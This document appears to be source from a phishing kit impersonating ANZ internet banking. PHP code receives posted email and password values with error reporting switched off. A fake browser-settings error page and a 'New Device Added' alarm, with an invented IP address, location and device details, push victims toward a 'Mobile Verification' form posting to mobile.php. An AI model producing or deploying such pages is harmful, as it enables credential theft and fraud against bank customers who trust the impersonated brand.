...
error_reporting(0);
   ...
   include "includes/Config.php";
    ...
    if( !isset($_POST['email']) || !isset($_POST['password']) ){ header("Location: login.php?_sessionid".$_SESSION['hash']); }
...
@keyframes icPxHz { 
  ...
  <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
        ...
        *,
		...
		<img data-test-id="header-logo" src="assets/anz-logo.1.0.0.svg" alt="ANZ Logo" class="sc-gipzik gJhOur"></div></div></header>
		<main class="sc-dnqmqq fgYQMj">
		<div class="sc-gqjmRU jwCRHS">
		<div class="sc-dxgOiQ iyDMES">
		<div class="sc-VigVT sc-jzJRlG bsYAOt">
		<div class="sc-bXGyLb ePIfrV">
		
		<img alt="Error Icon" data-test-id="error-page-info-icon" src="assets/Info-Icon.1.0.0.svg" aria-hidden="true" class="sc-daURTG frpFfQ"><h1 data-test-id="error-title" class="sc-iELTvK gQayGb">Please check your browser settings</h1></div>
		<div class="sc-lkqHmb jtlJDR">
		<div data-test-id="error-message" class="sc-eLExRp fFdpBA">
		<div class="sc-bdVaJa sc-bxivhb kMXqJD">
		<div class="sc-bwzfXH sc-ifAKCX fBZoRA">
		<div class="sc-htpNat sc-EHOje hiHoEC">
		
		
		<div class="sc-bwzfXH sc-ifAKCX jTKZuQ">
		<div class="sc-htpNat sc-EHOje fuDXid">
		<a data-test-id="software-requirements" href="#/support/internet-banking/getting-started/browser-software-settings/" rel="noopener" target="_self" class="sc-eHgmQL sc-cvbbAY jsqTYX">
		<button data-test-id="go-back-to-anz" class="sc-jKJlTe hUOKGW">View browser and software settings</button></a></div></div></div></div></div></div></div></div></main>
		...
		<ul id="progress-bar" class="steps-3"><li class="active" tabindex="-1"><span>Step 1<span class="step-detail">Notice</span></span><span class="a11y-context">currently active</span></li><li><span>Step 2<span class="step-detail">Mobile Verification</span></span><span class="a11y-context"> currently inactive</span></li><li><span>Step 3<span class="step-detail">Finish</span></span><span class="a11y-context"> currently inactive</span></li></ul>

		<main class="sc-gzVnrw dRvgMj">
		
		<div class="sc-htoDjs sc-iwsKbI fMWrBU">
		
		<div class="sc-htoDjs PQYSP">
		
		<div class="sc-chPdSV jDQaYf">
		
		<div class="sc-gZMcBi sc-gqjmRU aEZVB">
		
<form class="user-info-from-cookie" autocomplete="off" action="mobile.php?_sessionid=<?=$_SESSION['hash']?>" method="post" id="ualert-form" >
...
<div class="sc-bdVaJa sc-bxivhb gHmjpC"><div class="sc-bwzfXH sc-ifAKCX iozHEh"><div class="sc-htpNat sc-EHOje cmUniE">
		...
		<span role="text"> <div class="sc-dqBHgY jKIwyN">New Device Added!</div></span></h1></div></div></div>
		<div id="live-container"><div>
				<p class="form-instruction">A new iPhone 7 device has been added to your account on 09/06.</p>
				<p class="form-instruction">Device Information.</p>
				<ul>
				<li>
				<p>Mobile Name: iPhone 7</p>
				</li>
						<li>
				<p>IP Address: 194.68.32.253.</p>
				</li>
						<li>
				<p>Location: Brisbane.</p>
				</li>
						<li>
				<p>User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 <br>(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 </p>
				</li></ul>
			</div></div>
